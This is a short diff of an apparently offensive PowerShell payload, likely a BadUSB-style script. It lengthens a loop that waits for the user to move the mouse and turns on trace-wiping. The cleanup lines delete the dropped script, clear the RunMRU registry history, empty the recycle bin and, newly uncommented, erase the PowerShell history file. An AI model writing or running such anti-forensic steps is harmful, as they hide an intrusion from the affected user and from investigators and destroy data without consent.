@@ -33,7 +33,7 @@ $originalPOS = [System.Windows.Forms.Cursor]::Position.X
 $o=New-Object -ComObject WScript.Shell
 
     while (1) {
-        $pauseTime = 30
+        $pauseTime = 300
         if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
             break
         }
@@ -124,7 +124,7 @@ rm $D\Wm.ps1 -r -Force -ErrorAction SilentlyContinue
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
 # Delete powershell history
-#Remove-Item (Get-PSreadlineOption).HistorySavePath
+Remove-Item (Get-PSreadlineOption).HistorySavePath
 
 # Empty recycle bin
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
